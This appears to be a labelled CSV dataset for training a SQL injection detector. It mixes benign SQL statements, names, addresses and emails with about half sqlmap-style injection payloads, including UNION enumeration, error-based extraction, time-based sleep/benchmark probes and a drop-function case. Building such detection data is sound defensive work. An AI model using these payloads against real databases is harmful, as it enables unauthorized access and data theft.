Sentence,Label,Processed_Sentence
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,1.0,"0%"" or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and ""%""  =  """
SELECT * FROM determine FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from determine fetch first 0 percent rows only
"  SELECT * FROM glass WHERE life IN  ( 'fall', 'slip', 'heat' )  ",0.0,"  select * from glass where life in  ( 'fall', 'slip', 'heat' )  "
28430,0.0,0
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0   )    )    as xovu where 0  =  0 or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1.0,"0'  )   and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )  "
SELECT AVG ( native )  FROM personal  SELECT SUM ( shall ) ,0.0,select avg ( native )  from personal  select sum ( shall ) 
16727733v,0.0,0v
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""m"" ) ;",0.0,"  select replace ( ""xyz fgh xyz"", ""x"", ""m"" ) ;"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 252091 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1.0,if  (  0  =  0  )   select 0 else drop function ybru--
oroz-betelu,0.0,oroz-betelu
SELECT column_name FROM table_name WHERE column_name operator ANY,0.0,select column_name from table_name where column_name operator any
SELECT border,0.0,select border
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1.0,"0""  )   where 0  =  0 and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  --"
SELECT folks ( s )  FROM loss SELECT might ( s ) ,0.0,select folks ( s )  from loss select might ( s ) 
es518l132n,0.0,es0l0n
1 where 7802  =  7802,1.0,0 where 0  =  0
15124,0.0,0
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",1.0,"0""  )   and   (  0  =  0  )  *0 and   (  ""hkjf""  =  ""hkjf"
"   SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID ) ",0.0,"   select range,nuts,individual,hospital,present     (  (  continent join move on beat.grass =  weak.hungry )   inner join accidenton orders.current =  chest.trafficid ) "
SELECT * FROM report WHERE machinery = 'entirely'  AND  ( average = 'spend' OR bar = 'tight' ) ,0.0,select * from report where machinery = 'entirely'  and  ( average = 'spend' or bar = 'tight' ) 
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",1.0,"0 where 0  =  0 union all select null,null,null,null,null,null,null#"
"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,1.0,"0%""   )    )     )   procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )   and    (    (     (  ""%""  =  """
"  SELECT YEARWEEK ( ""2017-10-25"" ) ;",0.0,"  select yearweek ( ""0-0-0"" ) ;"
"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",1.0,"0""   )    )    union all select null,null,null,null,null,null,null,null,null#"
"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1.0,"0'  )   as mmhe where 0  =  0 or 0  =  benchmark  (  0,md0  (  0x0a0   )    )   --"
"  SELECT held,cow,plenty FROM may LEFT JOIN Orders ON stop.courseID =  deeply.machine ORDER BY about.sit",0.0,"  select held,cow,plenty from may left join orders on stop.courseid =  deeply.machine order by about.sit"
SELECT chance ( s )  FROM in SELECT worker ( s ) ,0.0,select chance ( s )  from in select worker ( s ) 
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,1.0,0'  )   and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq
SELECT * FROM connected WHERE game = 'breeze'  OR barn = 'clothes',0.0,select * from connected where game = 'breeze'  or barn = 'clothes'
SELECT * FROM private WHERE perfect BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from private where perfect between '0-0-0' and '0-0-0'
SELECT * FROM porch FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from porch fetch first 0 percent rows only
c/ agachadilla 81,0.0,c/ agachadilla 0
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0'||  (  select 'uqbj' from dual where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
villalobn,0.0,villalobn
graupere trabucco,0.0,graupere trabucco
SELECT MIN ( why )  AS pain FROM among,0.0,select min ( why )  as pain from among
"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1.0,"0'   )    )    as ewsw where 0  =  0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0b0c0   )    )      )    )     )  ,0  )  #"
SELECT COUNT ( wait ) FROM army,0.0,select count ( wait ) from army
"1%""   )    )    rlike sleep  (  5  )  #",1.0,"0%""   )    )    rlike sleep  (  0  )  #"
tapioles,0.0,tapioles
SELECT region ( s ) FROM aware INNER JOIN,0.0,select region ( s ) from aware inner join
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1.0,"-0""   )    )    union all select 0,0,0,0,0,0,0,0,0,0#"
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1.0,select * from users where id  =  0 or $+<\ or 0  =  0 -- 0
70129758k,0.0,0k
SELECT * FROM adventure FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM education,0.0,select * from adventure fetch first 0 percent rows onlyselect top 0 * from education
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""udlh""  =  ""udlh",1.0,"0""  )   and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and   (  ""udlh""  =  ""udlh"
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",1.0,"-0'   )    )     )   union all select 0,0,0,0,0,0--"
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",1.0,"0' or 0  =  benchmark  (  0,md0  (  0x0a0   )    )    and 'raru'  =  'raru"
boreo@creacionesdolcevita.mo,0.0,boreo@creacionesdolcevita.mo
"-2500'   )    )     )   union all select 6853,6853,6853,6853--",1.0,"-0'   )    )     )   union all select 0,0,0,0--"
vencilln,0.0,vencilln
ligurs,0.0,ligurs
SELECT Count ( * )  AS shelf,0.0,select count ( * )  as shelf
SELECT * FROM plain,0.0,select * from plain
6190000000000000,0.0,0
"1%""  )   union all select null,null--",1.0,"0%""  )   union all select null,null--"
poboleda,0.0,poboleda
SELECT MIN ( own )  AS window FROM had,0.0,select min ( own )  as window from had
SELECT * FROM student WHERE replace  BETWEEN 10 AND 20,0.0,select * from student where replace  between 0 and 0
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",1.0,"0""  )   as kfvy where 0  =  0 or sleep  (  0  )  --"
SELECT Count ( * )  AS blank,0.0,select count ( * )  as blank
frison@barnizultravioleta.jm,0.0,frison@barnizultravioleta.jm
SELECT * FROM paper WHERE child IN  ( SELECT triangle FROM list ) ,0.0,select * from paper where child in  ( select triangle from list ) 
SELECT TOP 3 * FROM rhythm SELECT * FROM purpose 3SELECT * FROM supply,0.0,select top 0 * from rhythm select * from purpose 0select * from supply
"  SELECT neededID AS ID, street AS carried FROM chest",0.0,"  select neededid as id, street as carried from chest"
lar,0.0,lar
repuesta,0.0,repuesta
"1'   )    )    as uvxv where 6663  =  6663 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0'   )    )    as uvxv where 0  =  0 and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
1   )    )    as jvvs where 9594  =  9594,1.0,0   )    )    as jvvs where 0  =  0
"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0'   )    )    as vqrt where 0  =  0 and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0'   )    )     )   or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1.0,"call regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and    (    (     (  ""%""  =  """
"SELECT DAYOFYEAR ( ""2017-01-01"" ) ;",0.0,"select dayofyear ( ""0-0-0"" ) ;"
SELECT AVG ( milk ) FROM written,0.0,select avg ( milk ) from written
SELECT * FROM join WHERE off IN  ( SELECT wait FROM printed ) ,0.0,select * from join where off in  ( select wait from printed ) 
"  SELECT tired AS history, slide AS [too]  FROM plenty",0.0,"  select tired as history, slide as [too]  from plenty"
alhama de granada,0.0,alhama de granada
SELECT * FROM far WHERE possibly = 'world',0.0,select * from far where possibly = 'world'
rosselot azcona,0.0,rosselot azcona
6160,0.0,0
76,0.0,0
SELECT * FROM gulf FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM riding,0.0,select * from gulf fetch first 0 rows only select top 0 percent * from riding
SELECT TOP 3 * FROM whale,0.0,select top 0 * from whale
"SELECT * FROM consonant WHERE grandfather BETWEEN ""living"" AND    ""against""",0.0,"select * from consonant where grandfather between ""living"" and    ""against"""
"-2434  )   union all select 8310,8310,8310,8310,8310--",1.0,"-0  )   union all select 0,0,0,0,0--"
SELECT AVG ( empty ) FROM collect SELECT SUM ( someone ) ,0.0,select avg ( empty ) from collect select sum ( someone ) 
" SELECT * FROM hurt ORDER BY longer, me",0.0," select * from hurt order by longer, me"
antoine,0.0,antoine
cufre sans,0.0,cufre sans
1' and 6621  =  4681--,1.0,0' and 0  =  0--
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0   )    )    as nxdf where 0  =  0 or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
"calle conjunto avenida, 116",0.0,"calle conjunto avenida, 0"
SELECT MIN ( interest )  AS flat FROM planet,0.0,select min ( interest )  as flat from planet
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm",1.0,"0'   )    )     )   and 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and    (    (     (  'cimm' like 'cimm"
murad@magadan.org.pe,0.0,murad@magadan.org.pe
"1""   )    )    as zemm where 3324  =  3324 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0""   )    )    as zemm where 0  =  0 or 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
6g369zar41,0.0,0g0zar0
knio,0.0,knio
"  SELECT stairs AS cool, arrangement AS [truth]  FROM forget",0.0,"  select stairs as cool, arrangement as [truth]  from forget"
5854,0.0,0
SELECT * FROM gas WHERE NOT attention = 'hollow'  AND NOT cell = 'search',0.0,select * from gas where not attention = 'hollow'  and not cell = 'search'
SELECT * FROM goose FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM policeman,0.0,select * from goose fetch first 0 rows only select top 0 percent * from policeman
katsuno@novolardiseno.br,0.0,katsuno@novolardiseno.br
jorquera,0.0,jorquera
"1"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0"" or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1.0,"0',row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )  "
"1  )   where 6720  =  6720 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1.0,"0  )   where 0  =  0 or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  --"
conejo mota,0.0,conejo mota
"-3856""  )   as iyzl where 7394  =  7394 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1.0,"-0""  )   as iyzl where 0  =  0 or 0  =  convert  (  int,  (  select char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )  --"
"  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  ",0.0,"  select * from why where rear not in  ( 'wagon', 'theory', 'battle' )  "
94731203e,0.0,0e
-8447 where 2850  =  2850 or 7147  =  3262,1.0,-0 where 0  =  0 or 0  =  0
olaf,0.0,olaf
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1.0,"-0%'  )   union all select 0,0,0,0,0,0,0,0,0--"
niwinska@estudiodeyoga.td,0.0,niwinska@estudiodeyoga.td
"SELECT EXTRACT ( YEAR_MONTH FROM ""2017-06-15 09:34:21"" ) ;",0.0,"select extract ( year_month from ""0-0-0 0:0:0"" ) ;"
SELECT TOP 50 PERCENT * FROM conversation,0.0,select top 0 percent * from conversation
SELECT COUNT ( production )  FROM since,0.0,select count ( production )  from since
SELECT MIN ( teacher )  AS song FROM castle,0.0,select min ( teacher )  as song from castle
SELECT * FROM cry,0.0,select * from cry
SELECT slip ( s FROM ago RIGHT JOIN,0.0,select slip ( s from ago right join
1'   )    )    as bbdf where 1327  =  1327,1.0,0'   )    )    as bbdf where 0  =  0
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1.0,"0  )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  "
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'hfxu' like 'hfxu",1.0,"0'  )   and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )   and   (  'hfxu' like 'hfxu"
1'||  (  select 'zwcp' where 3333  =  3333,1.0,0'||  (  select 'zwcp' where 0  =  0
nassiet.birkin@cienciapolicial.gl,0.0,nassiet.birkin@cienciapolicial.gl
SELECT * FROM  ( SELECT machinery FROM fog ) ,0.0,select * from  ( select machinery from fog ) 
" SELECT column_name ( s )  FROM might,birth",0.0," select column_name ( s )  from might,birth"
9.5286E+015,0.0,0.0e+0
m1n*6848,0.0,m0n*0
"iif  (  1539  =  1539,1539,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
bayarri bach,0.0,bayarri bach
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1.0,"0' and 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  "
"SELECT * FROM thy WHERE stems BETWEEN ""suit"" AND    ""breath""",0.0,"select * from thy where stems between ""suit"" and    ""breath"""
caballillo,0.0,caballillo
barceo,0.0,barceo
"  SELECT Orders.proverID, Employees.although, Employees.thin FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.equipmentID ORDER BY Orders.keyID",0.0,"  select orders.proverid, employees.although, employees.thin from ordersright join employees on orders.employeeid  =  employees.equipmentid order by orders.keyid"
SELECT * FROM stood WHERE NOT early = 'although'  AND NOT dollar = 'sight',0.0,select * from stood where not early = 'although'  and not dollar = 'sight'
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0'  )   where 0  =  0 or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
"1""   )    )    as tgwp where 9405  =  9405",1.0,"0""   )    )    as tgwp where 0  =  0"
"1%""  )   union all select null,null,null,null,null,null,null#",1.0,"0%""  )   union all select null,null,null,null,null,null,null#"
walker,0.0,walker
"1'   )    )     )   union all select null,null,null,null,null,null,null#",1.0,"0'   )    )     )   union all select null,null,null,null,null,null,null#"
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1.0,0%'   )    )     )   and 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and    (    (     (  '%'  =  '
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'ochr' like 'ochr",1.0,"0'   )    )     )   or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and    (    (     (  'ochr' like 'ochr"
"1%""   )    )    and 7358  =  6986--",1.0,"0%""   )    )    and 0  =  0--"
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",1.0,"0'   )    )     )   and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )   and    (    (     (  'ofko'  =  'ofko"
DELETE FROM rubber WHERE how = 'dirty',0.0,delete from rubber where how = 'dirty'
SELECT * FROM read WHERE NOT high = 'cowboy'  AND NOT water = 'wore',0.0,select * from read where not high = 'cowboy'  and not water = 'wore'
